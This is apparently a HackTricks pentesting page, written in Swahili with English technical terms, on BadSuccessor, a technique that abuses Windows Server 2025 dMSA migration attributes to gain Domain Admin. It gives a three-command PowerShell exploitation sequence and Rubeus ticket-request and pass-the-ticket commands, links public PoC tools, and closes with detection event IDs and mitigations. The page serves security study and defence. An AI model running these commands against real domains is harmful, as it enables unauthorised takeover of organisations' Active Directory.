# BadSuccessor: Kuongezwa kwa Privilege kupitia Unyanyasaji wa Uhamishaji wa Delegated MSA

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Delegated Managed Service Accounts (**dMSA**) ni warithi wa kizazi kijacho wa **gMSA**, wanaopatikana katika Windows Server 2025. Mtiririko halali wa uhamishaji huruhusu administrators kubadilisha akaunti ya *zamani* (akaunti ya mtumiaji, kompyuta au service) kwa dMSA huku permissions zikihifadhiwa kwa uwazi. Mtiririko huu unapatikana kupitia PowerShell cmdlets kama `Start-ADServiceAccountMigration` na `Complete-ADServiceAccountMigration`, na hutegemea LDAP attributes mbili za **dMSA object**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* inayoelekeza kwenye akaunti iliyobadilishwa (akaunti ya zamani).
* **`msDS-DelegatedMSAState`**       – hali ya uhamishaji (`0` = hakuna, `1` = unaendelea, `2` = *umekamilika*).<sup>[[1]](#references)</sup>

Ikiwa attacker anaweza kuunda dMSA yoyote ndani ya OU na kubadilisha moja kwa moja attributes hizo 2, LSASS na KDC zitaichukulia dMSA hiyo kama *mrithi* wa akaunti iliyounganishwa. Attacker anapothibitisha utambulisho wake baadaye kama dMSA, **atarithi privileges zote za akaunti iliyounganishwa** – hadi **Domain Admin** ikiwa akaunti ya Administrator imeunganishwa.<sup>[[1]](#references)</sup>

Technique hii iliitwa **BadSuccessor** na Unit 42 mwaka wa 2025. Wakati wa kuandika, **hakuna security patch** inayopatikana; ni kuimarisha OU permissions pekee kunakoweza kupunguza tatizo hili.<sup>[[1]](#references)[[2]](#references)</sup>

### Masharti ya shambulio

1. Akaunti ambayo *imeruhusiwa* kuunda objects ndani ya **Organizational Unit (OU)** *na* ina angalau moja kati ya hizi:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
* `Create Child` → **`All Objects`** (generic create)
2. Muunganisho wa mtandao kwenye LDAP na Kerberos (hali ya kawaida ya domain joined / remote attack).<sup>[[1]](#references)</sup>

## Kuhesabu OUs Zilizo Hatarini

Unit 42 ilitoa PowerShell helper script inayochanganua security descriptors za kila OU na kuangazia ACEs zinazohitajika:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Kwa ndani, script huendesha utafutaji wa LDAP wenye paging wa `(objectClass=organizationalUnit)` na hukagua kila `nTSecurityDescriptor` kwa

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8 (object class *msDS-DelegatedManagedServiceAccount*)

## Hatua za Exploitation

Mara tu OU inayoweza kuandikwa inapobainishwa, attack inahitaji LDAP writes 3 tu:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Baada ya replication, mshambuliaji anaweza **logon** kama `attacker_dMSA$` au kuomba Kerberos TGT – Windows itaunda token ya akaunti *iliyobadilishwa.*<sup>[[1]](#references)</sup>

### Automation

PoCs kadhaa za umma hufunga workflow nzima, ikijumuisha upatikanaji wa password na usimamizi wa ticket:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Utambuzi na Uwindaji

Washa **Object Auditing** kwenye OUs na fuatilia Windows Security Events zifuatazo:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Kuundwa kwa object ya **dMSA**
* **5136** – Marekebisho ya **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Mabadiliko mahususi ya attribute
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Kutolewa kwa TGT kwa ajili ya dMSA

Kuhusianisha `4662` (marekebisho ya attribute), `4741` (kuundwa kwa computer/service account) na `4624` (logon inayofuata) huonyesha kwa haraka shughuli za BadSuccessor. XDR solutions kama **XSIAM** huja na queries zilizo tayari kutumika (tazama marejeo).<sup>[[2]](#references)</sup>

## Upunguzaji wa Hatari

* Tumia kanuni ya **least privilege** – kabidhi usimamizi wa *Service Account* kwa roles zinazoaminika pekee.
* Ondoa `Create Child` / `msDS-DelegatedManagedServiceAccount` kutoka kwenye OUs ambazo hazihitaji ruhusa hiyo waziwazi.
* Fuatilia event IDs zilizoorodheshwa hapo juu na toa alert pale identities zisizo za *Tier-0* zinapounda au kuhariri dMSAs.

## Tazama pia


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Marejeo

- [1] [BadSuccessor: Kutumia vibaya dMSA ili kuongeza Privileges kwenye Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Accounts Nzuri Zinapokuwa Mbaya: Kutumia vibaya Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
